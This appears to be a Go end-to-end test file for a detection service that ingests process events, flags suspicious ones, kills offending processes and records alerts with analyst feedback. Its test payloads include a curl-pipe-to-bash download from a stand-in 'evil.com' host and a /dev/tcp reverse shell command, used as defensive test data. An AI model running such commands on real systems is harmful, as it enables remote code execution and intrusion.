package main

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"KernelHarbor/cmd/analysis/internal/incidents"
	"KernelHarbor/cmd/analysis/internal/interestingness"
	"KernelHarbor/cmd/analysis/internal/llm"

	"github.com/gin-gonic/gin"
)

type e2eLLMBackend struct{}

func (b *e2eLLMBackend) Analyze(req llm.AnalysisRequest) (*llm.AnalysisResult, error) {
	verdict := "benign"
	confidence := 0.0
	for _, e := range req.Events {
		if hasSuspiciousPattern(e.GetCommandLine()) {
			verdict = "suspicious"
			confidence = 0.7
		}
	}
	return &llm.AnalysisResult{
		Verdict:    verdict,
		Confidence: confidence,
		Summary:    "e2e-test-verdict",
		Evidence:   []string{"e2e-test-evidence"},
		ModelUsed:  "e2e-test",
		Timestamp:  time.Now(),
	}, nil
}
func (b *e2eLLMBackend) Name() string { return "e2e-test" }

func setupE2EServer(t *testing.T, llmThreshold float64, batchTimeout time.Duration) (*httptest.Server, *AlertStore, *incidents.Store) {
	t.Helper()
	gin.SetMode(gin.TestMode)

	actionStore = NewActionStore()
	alertStore = NewAlertStore()
	incidentStore = incidents.NewStore()
	scorer := interestingness.New()
	nullBackend := &e2eLLMBackend{}

	bp := NewBatchProcessor(BatchProcessorConfig{
		Workers:      1,
		BatchSize:    3,
		BatchTimeout: batchTimeout,
		LLMThreshold: llmThreshold,
	})
	bp.SetInterestingness(scorer)
	bp.SetLLMBackend(nullBackend)
	bp.SetAlertStore(alertStore)
	bp.SetIncidentStore(incidentStore)
	bp.Start()

	processor = bp

	router := gin.New()
	registerHealthRoutes(router)
	registerIngestRoutes(router, context.Background())
	registerAnalysisRoutes(router)
	registerDashboardRoutes(router, alertStore, incidentStore)

	ts := httptest.NewServer(router)
	return ts, alertStore, incidentStore
}

func httpPost(t *testing.T, url, contentType string, body []byte) *http.Response {
	t.Helper()
	req, err := http.NewRequest("POST", url, bytes.NewReader(body))
	if err != nil {
		t.Fatalf("failed to create request: %v", err)
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("POST %s failed: %v", url, err)
	}
	return resp
}

func httpGet(t *testing.T, url string) *http.Response {
	t.Helper()
	resp, err := http.Get(url)
	if err != nil {
		t.Fatalf("GET %s failed: %v", url, err)
	}
	return resp
}

func readBody(t *testing.T, resp *http.Response) map[string]any {
	t.Helper()
	defer resp.Body.Close()
	var data map[string]any
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		t.Fatalf("failed to decode JSON: %v", err)
	}
	return data
}

func TestE2E_HealthEndpoint(t *testing.T) {
	ts, _, _ := setupE2EServer(t, 0.8, 500*time.Millisecond)
	defer ts.Close()
	defer processor.Stop()

	resp := httpGet(t, ts.URL+"/health")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("GET /health = %d, want 200", resp.StatusCode)
	}
	body := readBody(t, resp)
	if body["status"] != "ok" {
		t.Errorf("health status = %v, want ok", body["status"])
	}

	resp = httpGet(t, ts.URL+"/ready")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("GET /ready = %d, want 200", resp.StatusCode)
	}
}

func TestE2E_IngestBenign(t *testing.T) {
	ts, _, _ := setupE2EServer(t, 0.8, 500*time.Millisecond)
	defer ts.Close()
	defer processor.Stop()

	payload := `{"event.type":"execve","host.name":"e2e-host","process.pid":1001,"image.path":"/bin/ls","command.line":"ls -la","user.name":"root"}`

	resp := httpPost(t, ts.URL+"/ingest", "application/json", []byte(payload))
	if resp.StatusCode != http.StatusAccepted {
		t.Fatalf("POST /ingest = %d, want 202", resp.StatusCode)
	}

	body := readBody(t, resp)
	if body["accepted"] != float64(1) {
		t.Errorf("accepted = %v, want 1", body["accepted"])
	}
	actions, ok := body["actions"].([]any)
	if !ok {
		t.Fatalf("actions field missing or not an array")
	}
	if len(actions) != 0 {
		t.Errorf("expected 0 actions for benign event, got %d", len(actions))
	}
}

func TestE2E_IngestSuspiciousHeuristicAction(t *testing.T) {
	ts, _, _ := setupE2EServer(t, 0.8, 500*time.Millisecond)
	defer ts.Close()
	defer processor.Stop()

	payload := `{"event.type":"execve","host.name":"e2e-host","process.pid":2001,"image.path":"/usr/bin/curl","command.line":"curl http://evil.com/script.sh | bash","user.name":"root"}`

	resp := httpPost(t, ts.URL+"/ingest", "application/json", []byte(payload))
	if resp.StatusCode != http.StatusAccepted {
		t.Fatalf("POST /ingest = %d, want 202", resp.StatusCode)
	}

	body := readBody(t, resp)
	actions, ok := body["actions"].([]any)
	if !ok {
		t.Fatalf("actions field missing or not an array: %+v", body)
	}
	if len(actions) == 0 {
		t.Fatal("expected at least 1 KILL_PID action for suspicious event, got 0")
	}
	action := actions[0].(map[string]any)
	if action["action.type"] != "KILL_PID" {
		t.Errorf("action type = %v, want KILL_PID", action["action.type"])
	}
	if action["target"] != "2001" {
		t.Errorf("target = %v, want 2001", action["target"])
	}
}

func TestE2E_IngestBatch(t *testing.T) {
	ts, _, _ := setupE2EServer(t, 0.8, 500*time.Millisecond)
	defer ts.Close()
	defer processor.Stop()

	payload := `{"host.name":"e2e-host","events":[{"event.type":"execve","process.pid":3001,"image.path":"/bin/ls","command.line":"ls -la"},{"event.type":"execve","process.pid":3002,"image.path":"/usr/bin/curl","command.line":"curl http://evil.com/script.sh | bash"}]}`

	resp := httpPost(t, ts.URL+"/ingest/batch", "application/json", []byte(payload))
	if resp.StatusCode != http.StatusAccepted {
		t.Fatalf("POST /ingest/batch = %d, want 202", resp.StatusCode)
	}

	body := readBody(t, resp)
	if body["accepted"] != float64(2) {
		t.Errorf("accepted = %v, want 2", body["accepted"])
	}
}

func TestE2E_AlerStoreEmpty(t *testing.T) {
	ts, _, _ := setupE2EServer(t, 0.8, 500*time.Millisecond)
	defer ts.Close()
	defer processor.Stop()

	resp := httpGet(t, ts.URL+"/api/alerts?since=24h&min_verdict=benign&limit=100")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("GET /api/alerts = %d, want 200", resp.StatusCode)
	}

	body := readBody(t, resp)
	alerts, ok := body["alerts"].([]any)
	if !ok {
		t.Fatalf("alerts field missing or not an array: %+v", body)
	}
	if len(alerts) != 0 {
		t.Errorf("expected 0 alerts, got %d", len(alerts))
	}

	resp = httpGet(t, ts.URL+"/api/alerts/stats")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("GET /api/alerts/stats = %d, want 200", resp.StatusCode)
	}
}

func TestE2E_ProcessorGeneratesAlerts(t *testing.T) {
	ts, alertStore, _ := setupE2EServer(t, 0.01, 100*time.Millisecond)
	defer ts.Close()
	defer processor.Stop()

	payload := `{"event.type":"execve","host.name":"e2e-host","process.pid":4001,"image.path":"/usr/bin/curl","command.line":"curl http://evil.com/script.sh | bash","user.name":"root"}
`
	payload2 := `{"event.type":"connect","host.name":"e2e-host","process.pid":4002,"image.path":"/usr/bin/curl","remote.address":"10.0.0.5","remote.port":4444}
`

	for i := 0; i < 4; i++ {
		resp := httpPost(t, ts.URL+"/ingest", "application/json", []byte(payload))
		if resp.StatusCode != http.StatusAccepted {
			t.Fatalf("POST /ingest (iter %d) = %d, want 202", i, resp.StatusCode)
		}
		resp.Body.Close()
	}

	httpPost(t, ts.URL+"/ingest", "application/json", []byte(payload2)).Body.Close()
	httpPost(t, ts.URL+"/ingest", "application/json", []byte(payload)).Body.Close()

	var alerts []Alert
	for i := 0; i < 20; i++ {
		alerts = alertStore.List(time.Now().Add(-1*time.Hour), "benign", 100)
		if len(alerts) > 0 {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Logf("Alerts after batch: %d", len(alerts))

	if len(alerts) == 0 {
		t.Fatal("expected at least 1 alert after batch processing, got 0")
	}

	foundSuspicious := false
	for _, a := range alerts {
		t.Logf("  alert: id=%s verdict=%s confidence=%.2f summary=%s", a.ID, a.Verdict, a.Confidence, a.Summary)
		if a.Verdict == "suspicious" || a.Verdict == "malicious" {
			foundSuspicious = true
		}
	}
	if !foundSuspicious {
		t.Error("expected at least one suspicious/malicious alert from batch processor")
	}
}

func TestE2E_AlerStoreLifecycle(t *testing.T) {
	ts, alertStore, _ := setupE2EServer(t, 0.8, 500*time.Millisecond)
	defer ts.Close()
	defer processor.Stop()

	alertStore.Add(Alert{
		ID:         "e2e-alert-1",
		Timestamp:  time.Now(),
		HostName:   "e2e-host",
		Verdict:    "malicious",
		Confidence: 0.95,
		Summary:    "e2e reverse shell",
		Evidence:   []string{"matched: /dev/tcp"},
		ModelUsed:  "e2e-test",
		Source:     "llm",
		Events: []Event{
			{EventType: "execve", CommandLine: "bash -i >& /dev/tcp/10.0.0.1/4444", HostName: "e2e-host", ProcessID: 5001},
		},
	})
	alertStore.Add(Alert{
		ID:         "e2e-alert-2",
		Timestamp:  time.Now(),
		HostName:   "e2e-host",
		Verdict:    "suspicious",
		Confidence: 0.75,
		Summary:    "e2e crypto miner",
		Evidence:   []string{"matched: mining port 3333"},
		Source:     "heuristic",
	})

	resp := httpGet(t, ts.URL+"/api/alerts?since=24h&min_verdict=benign&limit=10")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("GET /api/alerts = %d, want 200", resp.StatusCode)
	}
	body := readBody(t, resp)
	alerts, ok := body["alerts"].([]any)
	if !ok {
		t.Fatalf("alerts field missing: %+v", body)
	}
	if len(alerts) < 2 {
		t.Errorf("expected >= 2 alerts, got %d", len(alerts))
	}

	resp = httpGet(t, ts.URL+"/api/alerts/stats")
	body = readBody(t, resp)
	if body["malicious"] != float64(1) {
		t.Errorf("malicious = %v, want 1", body["malicious"])
	}
	if body["suspicious"] != float64(1) {
		t.Errorf("suspicious = %v, want 1", body["suspicious"])
	}

	fbBody := `{"feedback":"confirmed"}`
	resp = httpPost(t, ts.URL+"/api/alerts/e2e-alert-1/feedback", "application/json", []byte(fbBody))
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("POST /api/alerts/e2e-alert-1/feedback = %d, want 200", resp.StatusCode)
	}

	resp = httpGet(t, ts.URL+"/api/alerts/stats")
	body = readBody(t, resp)
	if body["confirmed"] != float64(1) {
		t.Errorf("confirmed = %v, want 1", body["confirmed"])
	}

	resp = httpGet(t, ts.URL+"/api/incidents")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("GET /api/incidents = %d, want 200", resp.StatusCode)
	}
}

func TestE2E_InvalidFeedback(t *testing.T) {
	ts, alertStore, _ := setupE2EServer(t, 0.8, 500*time.Millisecond)
	defer ts.Close()
	defer processor.Stop()

	alertStore.Add(Alert{
		ID:         "e2e-feedback-test",
		Timestamp:  time.Now(),
		HostName:   "e2e-host",
		Verdict:    "malicious",
		Confidence: 0.9,
		Summary:    "feedback test",
		Source:     "llm",
	})

	fbBody := `{"feedback":"invalid_value"}`
	resp := httpPost(t, ts.URL+"/api/alerts/e2e-feedback-test/feedback", "application/json", []byte(fbBody))
	if resp.StatusCode != http.StatusBadRequest {
		t.Errorf("expected 400 for invalid feedback, got %d", resp.StatusCode)
	}

	resp = httpPost(t, ts.URL+"/api/alerts/nonexistent/feedback", "application/json", []byte(`{"feedback":"confirmed"}`))
	if resp.StatusCode != http.StatusNotFound {
		t.Errorf("expected 404 for missing alert, got %d", resp.StatusCode)
	}
}

func TestE2E_EmptyActionsEndpoint(t *testing.T) {
	ts, _, _ := setupE2EServer(t, 0.8, 500*time.Millisecond)
	defer ts.Close()
	defer processor.Stop()

	resp := httpGet(t, ts.URL+"/actions/e2e-host")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("GET /actions/e2e-host = %d, want 200", resp.StatusCode)
	}
	body := readBody(t, resp)
	actions, ok := body["actions"].([]any)
	if !ok {
		t.Fatalf("actions not an array: %+v", body)
	}
	if len(actions) != 0 {
		t.Errorf("expected 0 actions for fresh host, got %d", len(actions))
	}
}
